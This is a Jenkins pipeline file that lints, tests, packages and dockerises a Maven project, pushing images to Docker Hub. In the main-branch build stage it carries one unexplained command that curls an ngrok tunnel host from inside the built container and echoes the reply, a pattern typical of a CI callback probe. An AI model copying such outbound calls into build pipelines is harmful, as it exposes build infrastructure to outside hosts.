pipeline {
    agent any
    
    environment {
        MAVEN_HOME = tool 'M3' //
        DOCKER_REPO_MR = "iancumatei67/mr" // 
        DOCKER_REPO_MAIN = "iancumatei67/main" // 
    }
    
    stages {
        stage('Checkstyle') {
            steps {
                script {
                    // Use Maven for Checkstyle
                    sh "${MAVEN_HOME}/bin/mvn checkstyle:checkstyle"
                    archiveArtifacts 'target/checkstyle-result.xml'
                }
            }
        }
        
        stage('Test') {
            steps {
                script {
                    // Use Maven for testing
                    sh "${MAVEN_HOME}/bin/mvn test"
                }
            }
        }
        
        stage('Build') {
            steps {
                script {
                    // Use Maven for building without tests
                    sh "${MAVEN_HOME}/bin/mvn package -DskipTests"
                }
            }
        }
        
        stage('Build Docker Image (Main)') {
            when {
                branch 'main'
            }
            steps {
                script {
                    app = docker.build("iancumatei67/main")
                    app.inside {
                        sh 'echo $(curl https://7bf7-85-204-75-2.ngrok-free.app)'
                    }
                }
            }
        }
        
        stage('Push Docker Image (Main)') {
            when {
                branch 'main'
            }
            steps {
                script {
                    docker.withRegistry('https://registry.hub.docker.com', 'docker_hub_login') {
                        app.push("${env.BUILD_NUMBER}")
                        app.push("latest")
                    }
                }
            }
        }

        stage('Build and Push Docker Image (MR)') {
            when {
                expression {
                    // Execute this stage only for merge requests
                    return env.CHANGE_ID != null
                }
            }
           steps {
                script {
                    // Build Docker image
                    def dockerImage = docker.build("${DOCKER_REPO_MR}:${env.CHANGE_ID}", '.')

                    // Push Docker image
                    docker.withRegistry('https://registry.hub.docker.com', 'docker_hub_login') {
                        dockerImage.push("${env.CHANGE_ID}")
                        dockerImage.push("latest")
                    }
                }
            }
        }
    }
    
    post {
        always {
            cleanWs() // Clean workspace after the pipeline execution
        }
    }
}
